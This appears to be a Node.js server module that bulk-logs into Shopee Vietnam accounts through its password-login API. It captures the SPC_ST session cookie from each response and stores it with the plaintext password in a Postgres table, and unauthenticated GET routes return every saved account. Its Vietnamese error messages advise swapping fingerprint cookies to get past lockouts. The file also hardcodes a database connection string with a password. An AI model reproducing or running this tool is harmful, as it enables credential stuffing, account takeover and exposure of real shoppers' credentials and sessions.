const https = require('https');
const crypto = require('crypto');
const { Pool } = require('pg');

const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';

const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

async function initDB() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS taikhoan (
                id SERIAL PRIMARY KEY,
                phone TEXT,
                username TEXT,
                email TEXT,
                password TEXT,
                spc_f TEXT,
                spc_st TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
    } finally {
        client.release();
    }
}

function hashPassword(rawPassword) {
    const md5Hash = crypto.createHash('md5').update(rawPassword || '').digest('hex');
    return crypto.createHash('sha256').update(md5Hash).digest('hex');
}

function normalizePhone(phone) {
    if (!phone) return phone;
    if (phone.startsWith('84')) return phone;
    if (phone.startsWith('0')) return '84' + phone.slice(1);
    return '84' + phone;
}

function loginShopee(identifierKey, identifierValue, rawPassword, spc_f) {
    return new Promise((resolve, reject) => {
        const passwordHash = hashPassword(rawPassword);
        const payload = {
            client_identifier: { security_device_fingerprint: 'test9' },
            password: passwordHash,
            stay_logged_in: true,
            support_ivs: true,
            [identifierKey]: identifierValue
        };
        const data = JSON.stringify(payload);

        const options = {
            hostname: 'shopee.vn',
            path: '/api/v4/account/login_by_password',
            method: 'POST',
            headers: {
                'accept': 'application/json',
                'accept-language': 'vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/json',
                'content-length': Buffer.byteLength(data, 'utf8'),
                'cookie': 'SPC_F=' + (spc_f || ''),
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0'
            }
        };

        const req = https.request(options, (res) => {
            let spcSt = null;
            const setCookie = res.headers['set-cookie'];
            if (Array.isArray(setCookie)) {
                const cookie = setCookie.find(c => c.trim().startsWith('SPC_ST='));
                if (cookie) spcSt = cookie.split(';')[0].replace('SPC_ST=', '');
            } else if (typeof setCookie === 'string' && setCookie.trim().startsWith('SPC_ST=')) {
                spcSt = setCookie.split(';')[0].replace('SPC_ST=', '');
            }

            const chunks = [];
            res.on('data', (chunk) => chunks.push(chunk));
            res.on('end', () => {
                const body = Buffer.concat(chunks).toString('utf8');
                let parsedBody;
                try { parsedBody = JSON.parse(body); } catch { parsedBody = { raw: body }; }

                resolve({
                    statusCode: res.statusCode,
                    responseHeaders: res.headers,
                    spcSt: spcSt,
                    shopeeResponse: parsedBody,
                    passwordHash: passwordHash,
                    sentPayload: payload
                });
            });
        });

        req.on('error', (err) => {
            reject({ error: err.message, sentPayload: payload });
        });
        req.write(data);
        req.end();
    });
}

function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try { resolve(body ? JSON.parse(body) : {}); }
            catch { reject(new Error('Invalid JSON body')); }
        });
    });
}

function isSuccess(response) {
    if (!response) return false;
    if (response.error === 0) return true;
    if (response.error_code === 0) return true;
    return false;
}

function getErrorDescription(errorCode) {
    const code = Number(errorCode);
    switch (code) {
        case 0:  return 'lấy SPC_ST thành công';
        case 2:  return 'Tài khoản không chính xác';
        case 9:  return 'Tài khoản đã bị khóa';
        case 89: return 'Không thể lấy SPC_ST,chờ 24h hoặc sử dụng SPC_F khác';
        case 98: return 'SPC_F chưa chính xác, sử dụng SPC_F khác';
        default: return 'lỗi không xác định';
    }
}

async function handleLoginRoutes(req, res) {
    try {
        if (req.method === 'POST' && req.url === '/batch-login') {
            const body = await parseBody(req);
            const { listUser } = body;

            if (!Array.isArray(listUser)) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'listUser phải là array' }));
                return true;
            }

            const MAX_USERS = 50;
            const usersToProcess = listUser.slice(0, MAX_USERS);
            const results = [];

            for (const user of usersToProcess) {
                const { username, phone: rawPhone, email, SPC_F, password } = user;
                const phone = rawPhone ? normalizePhone(rawPhone) : rawPhone;

                const identifierCandidates = [];
                if (username) identifierCandidates.push({ key: 'username', value: username });
                if (phone) identifierCandidates.push({ key: 'phone', value: phone });
                if (email) identifierCandidates.push({ key: 'email', value: email });

                let idKey = 'phone';
                let idValue = '';
                if (identifierCandidates.length > 0) {
                    idKey = identifierCandidates[0].key;
                    idValue = identifierCandidates[0].value;
                }

                try {
                    const shopeeResult = await loginShopee(idKey, idValue, password, SPC_F);

                    if (isSuccess(shopeeResult.shopeeResponse)) {
                        await pool.query(
                            `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
                             VALUES ($1, $2, $3, $4, $5, $6)`,
                            [
                                phone || null,
                                username || null,
                                email || null,
                                password || null,
                                SPC_F || null,
                                shopeeResult.spcSt || null
                            ]
                        );
                    }

                    const errCode = shopeeResult.shopeeResponse?.error ?? null;

                    const resultItem = {
                        spcSt: shopeeResult.spcSt,
                        error: errCode,
                        des: getErrorDescription(errCode)
                    };
                    resultItem[idKey] = idValue;
                    results.push(resultItem);

                } catch (err) {
                    const errorItem = {
                        spcSt: null,
                        error: err.error || err.message,
                        des: getErrorDescription(err.error) || 'lỗi không xác định'
                    };
                    errorItem[idKey] = idValue;
                    results.push(errorItem);
                }
            }

            res.writeHead(200);
            res.end(JSON.stringify({ results: results }, null, 2));
            return true;
        }

        if (req.method === 'GET' && req.url === '/taikhoan') {
            const result = await pool.query('SELECT * FROM taikhoan ORDER BY id DESC');
            res.writeHead(200);
            res.end(JSON.stringify({ success: true, count: result.rowCount, data: result.rows }));
            return true;
        }

        if (req.method === 'GET' && req.url.startsWith('/taikhoan/')) {
            const id = req.url.replace('/taikhoan/', '');
            const result = await pool.query('SELECT * FROM taikhoan WHERE id = $1', [id]);
            if (result.rows.length === 0) {
                res.writeHead(404);
                res.end(JSON.stringify({ success: false, error: 'Not found' }));
                return true;
            }
            res.writeHead(200);
            res.end(JSON.stringify({ success: true, data: result.rows[0] }));
            return true;
        }
    } catch (err) {
        console.error('Login route error:', err);
        if (!res.writableEnded) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: err.message }));
        }
        return true;
    }

    return false;
}

module.exports = { handleLoginRoutes, initDB, pool };